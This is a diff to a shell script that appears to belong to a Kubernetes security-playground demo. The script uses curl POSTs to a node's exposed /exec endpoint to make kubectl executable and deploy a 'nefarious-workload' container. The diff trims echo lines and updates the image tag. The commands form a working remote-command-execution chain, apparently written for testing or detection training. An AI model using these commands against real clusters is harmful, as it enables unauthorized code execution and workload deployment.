@@ -90,13 +90,7 @@ echo "---"
 echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'"
 echo "---"
 curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
-echo "---"
-echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:070124'"
-echo "---"
-curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:070124'
-echo "---"
-echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'"
-echo "---"
+curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:240324'
 curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
 echo "--------------------------------------------------------------------------------"
 sleep 15
